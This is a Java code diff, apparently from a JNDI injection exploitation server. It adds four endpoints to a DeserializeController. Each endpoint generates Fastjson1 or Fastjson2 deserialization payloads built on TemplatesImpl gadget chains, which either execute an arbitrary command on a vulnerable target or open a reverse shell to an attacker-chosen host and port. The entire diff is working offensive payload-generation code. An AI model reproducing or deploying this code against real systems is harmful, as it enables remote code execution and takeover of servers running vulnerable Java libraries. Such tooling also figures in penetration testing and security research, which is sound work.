@@ -133,4 +133,40 @@ public class DeserializeController implements Controller {
         byte[] data = Jackson.create(templatesImpl);
         return data;
     }
+
+    @JNDIMapping("/Fastjson1/Command/{cmd}")
+    public byte[] Fastjson1Cmd(String cmd) throws Exception {
+        System.out.println("[Deserialize] [Fastjson1] [Command] Cmd: " + cmd);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
+        byte[] data = Fastjson1.create(templatesImpl);
+        return data;
+    }
+
+    @JNDIMapping("/Fastjson1/ReverseShell/{host}/{port}")
+    public byte[] Fastjson1ReverseShell(String host, String port) throws Exception {
+        System.out.println("[Deserialize] [Fastjson1] [ReverseShell] Host: " + host + " Port: " + port);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
+        byte[] data = Fastjson1.create(templatesImpl);
+        return data;
+    }
+
+    @JNDIMapping("/Fastjson2/Command/{cmd}")
+    public byte[] Fastjson2Cmd(String cmd) throws Exception {
+        System.out.println("[Deserialize] [Fastjson2] [Command] Cmd: " + cmd);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(cmd);
+        byte[] data = Fastjson2.create(templatesImpl);
+        return data;
+    }
+
+    @JNDIMapping("/Fastjson2/ReverseShell/{host}/{port}")
+    public byte[] Fastjson2ReverseShell(String host, String port) throws Exception {
+        System.out.println("[Deserialize] [Fastjson2] [ReverseShell] Host: " + host + " Port: " + port);
+
+        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(host, Integer.parseInt(port));
+        byte[] data = Fastjson2.create(templatesImpl);
+        return data;
+    }
 }
